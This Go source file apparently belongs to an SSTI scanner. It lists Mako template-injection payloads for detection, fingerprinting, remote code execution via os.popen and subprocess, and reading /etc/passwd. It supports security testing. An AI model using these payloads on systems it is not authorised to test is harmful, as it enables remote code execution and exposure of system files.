package ssti

// Mako payloads (Python).
// Source: PayloadsAllTheThings, HackTricks
var makoPayloads = []Payload{
	// Detection payloads
	{
		Value:           "${7*7}",
		Engine:          EngineMako,
		Type:            TypeDetection,
		Description:     "Basic Mako math expression",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "${7+7}",
		Engine:          EngineMako,
		Type:            TypeDetection,
		Description:     "Mako addition",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "14",
	},
	// Fingerprint
	{
		Value:           "${self}",
		Engine:          EngineMako,
		Type:            TypeFingerprint,
		Description:     "Mako self object",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "Namespace",
	},
	// RCE payloads
	{
		Value:           "${__import__('os').popen('id').read()}",
		Engine:          EngineMako,
		Type:            TypeRCE,
		Description:     "Mako RCE via os.popen",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "<%\nimport os\n%>${os.popen('id').read()}",
		Engine:          EngineMako,
		Type:            TypeRCE,
		Description:     "Mako RCE via import block",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "<%import subprocess%>${subprocess.check_output('id', shell=True).decode()}",
		Engine:          EngineMako,
		Type:            TypeRCE,
		Description:     "Mako RCE via subprocess",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	// File read
	{
		Value:           "${open('/etc/passwd').read()}",
		Engine:          EngineMako,
		Type:            TypeFileRead,
		Description:     "Mako file read",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "root:",
	},
}
